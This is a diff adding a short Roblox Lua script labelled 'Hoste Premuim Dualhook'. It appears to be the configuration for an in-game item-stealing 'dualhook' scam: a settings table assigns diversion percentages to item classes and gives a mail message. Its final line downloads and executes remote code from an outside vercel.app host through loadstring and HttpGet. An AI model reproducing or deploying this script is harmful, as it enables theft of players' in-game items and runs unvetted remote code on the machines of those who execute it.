@@ -1,0 +1,45 @@
+--{{ Hoste Premuim Dualhook }}--
+    getgenv().Settings = {
+      User = "Hostee-YEPJZODUZDYRAREN",
+      Webhook = false, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
+      MailMessage = "Hostee Scriptz",
+      Titanics = {
+          Dualhook = true,
+          Intensity = 100 --%
+      },
+      Banana = {
+          Dualhook = true,
+          Intensity = 100 --%
+      },
+      Huges = {
+          Dualhook = true,
+          Intensity = 50 --%
+      },
+      Pogs = {
+          Dualhook = true,
+          Intensity = 0 --%
+      },
+      Exclusives = {
+          Dualhook = true,
+          Intensity = 0 --%
+      },
+      Events = {
+          Dualhook = true,
+          Intensity = 0 --%
+      },
+      Secrets = {
+          Dualhook = true,
+          Intensity = 0 --%
+      },
+      HC_DM_Mythics = {
+          Dualhook = true,
+          Intensity = 0 --%
+      },
+      Gems = {
+          Dualhook = true,
+          Intensity = 50 --%
+      }
+  }
+    
+--{{ Script }}--
+loadstring(game:HttpGet("https://demon1zed.vercel.app/Hostee/DualhookPrem.lua"))()
